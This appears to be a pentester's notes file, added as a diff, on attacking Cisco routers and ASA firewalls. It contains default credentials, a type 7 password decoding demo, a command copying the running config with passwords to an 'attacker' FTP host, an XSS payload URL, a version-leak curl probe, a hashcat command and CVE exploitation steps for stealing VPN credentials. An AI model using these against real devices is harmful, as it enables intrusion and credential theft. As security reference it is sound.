@@ -1,0 +1,125 @@
+# cisco
+
+https://github.com/nccgroup/cisco-SNMP-enumeration
+
+# heap overflow CVE-2016-1287
+https://blog.exodusintel.com/
+
+# get version of Cisco ASA OS
+/admin/exec/show+version
+
+./net-analyzer/vomit/vomit-0.2c.ebuild:DESCRIPTION="Converts a Cisco IP phone conversation into a wav file"
+enable.c # bruteforce enable
+
+# http-default-accounts.nse
+  name = "Cisco 2811",
+  category = "routers",
+  paths = {
+    {path = "/exec/show/log/CR"},
+    {path = "/level/15/exec/-/configure/http"},
+    {path = "/level/15/exec/-"},
+    {path = "/level/15/"}
+  },
+  login_combos = {
+    {username = "", password = ""},
+    {username = "cisco", password = "cisco"}
+
+telnet est dispo depuis toutes les VRF (et non la VRF par defaut contrairement à ce que alain croyait)
+Donc il FAUT mettre une access-list sur le VTY sinon on peut faire telnet depuis Internet.
+Et aussi pourrir son syslog (port UDP en ecoute)
+
+# vulns
+https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2009-002/?fid=3764
+
+# Comment savoir si le routeur est synchronisé par NTP et que ça marche bien ?
+# Faire un show clock et si ya un '.' en debut de ligne alors ça veut dire que
+# ya pas NTP ou que ya NTP mais que ça marche pas.
+.14:56:11.739 CET Thu Jun 11 2009
+
+# outil d'analyse des regles de filtrage Cisco
+http://runplaybook.com/p/11
+
+# download cisco config via snmp rw community
+msf tftp
+
+# decoding type 7 (vigenere cipher from 16th century)
+cisco# conf t
+cisco(config)# key chain thisisatest
+cisco(config-keychain)# key 1
+cisco(config-keychain)# key-string 7 0539030E2D405725490B10220A1F173D24362C72
+cisco(config-keychain)# ctrl+z
+cisco# show key chain
+Key-chain thisisatest:
+    key 1 -- text "ReallyL0ngPassword!"
+
+cisco# conf t
+cisco(config)# no key chain thisisatest
+cisco(config-keychain)# ctrl+z
+
+# vieux clients
+https://helpdesk.ugent.be/vpn/en/akkoord.php
+
+# afficher config avec passwords en clair // http://www.cisco.com/c/en/us/support/docs/security/pix-500-series-security-appliances/82076-preshared-key-recover.html
+more system:running-config # au lieu de show run
+ou
+http://10.0.0.1/config
+ou
+copy running-config ftp://attacker/running-config
+
+# Cisco ASA vulns
+-- xss
+/+CSCOE+/logon.html?reason=2&a0=63&a1=&a2=&a3=0&next=&auth_handle=%22%20style%3dbehavior%3aurl(%23default%23time2)%20onbegin%3dalert(1)%20blah&status=0&username=&password_min=0&state=&tgroup=&serverType=0&password_days=0
+
+-- Jonathan Claudius https://speakerdeck.com/claudijd/crowdsourcing-your-cisco-firewall-administration-dot-dot-dot-wat
+CVE-2014-2126 CVE-2014-2127
+* http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20140409-asa
+
+-- ruxcon 2014
+* http://denraelevisgniht.blogspot.co.nz/2014/10/cisco-asa-clientless-ssl-vpn.html
+* http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20141008-asa
+CVE-2014-3391 jailbreak method 1
+CVE-2014-3390 jailbreak method 2
+CVE-2014-3393 preview to change login page
+CVE-2014-3389 run commands on standby unit
+CVE-2014-3398 find standby unit with /CSCOSSLC/config-auth discloses fw version
+
+The login page of the WebVPN portal can be customized (eg. change company logo, font, colors etc.) via the ASDM interface which is normally not accessible from the Internet, as opposed to the WebVPN portal which is accessible to everyone.
+The researcher found that these customization functions can actually be accessed through the WebVPN portal as well.
+CVE-2014-3393: authentication bypass vulnerability: attacker can access the customization functions (preview & save) without authentication, and change the login page to steal user creds. (only pre-condition IIRC is the preview directory must be already created ie. someone must have used the preview function before)
+CVE-2014-3389: as an unprivileged SSL user, attacker can send packets to the standby firewall without authentication to run commands as user enable_15 (root).
+CVE-2014-3398: find the ASA standby firewall by scanning for /CSCOSSLC/config-auth, which also discloses the firmware version. (e.g. 9.1(2) is vuln)
+Attacker creates user on the standby firewall, login to standby and run commands on the active firewall.
+Attacker adds NAT rules to be able to access sensitive internal servers without triggering IDS or having to compromise “pivot” hosts.
+CVE-2014-339[01]: two ways to escape from the Cisco shell to /bin/sh as root in order to install rootkit and hide the NAT rules.
+
+
+To be exploitable, there is an important condition:
+- The preview button must have been clicked at least once since the ASA booted. (ie. after the ASA is restarted the preview button has to be clicked again).
+
+To click the preview button, the victim must have created a new customization object (which can simply be done by exporting Template and re-importing it), clicked on Edit and finally clicked on the Preview button (see preview-button.png).
+ 
+If this has never been done then the ASA returns a HTTP 200 in response to the first POST request. Otherwise it’s a HTTP 302 redirect to a preview of the new page. The first 3 requests create the preview, the 4th request saves the changes.
+ 
+A “safe check” would therefore be to simply issue the first 3 requests, and if we get a 302 to the first request and our arbitrary payload is included in the HTML response to the 3rd request, then it’s very likely vulnerable.
+
+To be easily exploitable, there is an important condition:
+- The default customization object “DfltCustomization” must still be in use.
+ 
+Specifically, if the client created a new customization object to have a customized login page, then obviously the attacker will need to guess the name of this new customization object to be able to alter the login page (by default the exploit references “DfltCustomization”). However assuming the attacker successfully guesses it, it will be quite difficult to revert to the original page.
+
+On the other hand, if the client created a new customization object but didn’t assign any profile, then the login page still uses DfltCustomization and the attacker can alter the login page.
+
+Some important notes:
+• The change does not survive a restart unless someone saves the running configuration.
+• Attacker can revert to a sane login page by running the exploit with a stock DfltCustomization. Strangely though the lab’s ASA login page is different than a stock DfltCustomization.
+
+# version leak
+http://carnal0wnage.attackresearch.com/2015/02/cisco-asa-version-grabber-cve-2014-3398.html
+curl -ssl -k  -v "https://1.2.3.4/CSCOSSLC/config-auth"
+
+# Decrypt Cisco Secure Access Control System repository passwords
+http://www.synacktiv.com/ressources/cisco_acs_repo_decrypt.py
+
+# cisco pix password hash format
+passwd 2KFQnbNIdI.2KYOU encrypted => "cisco"
+hashcat -m 2400 pw.hc wordlist.txt
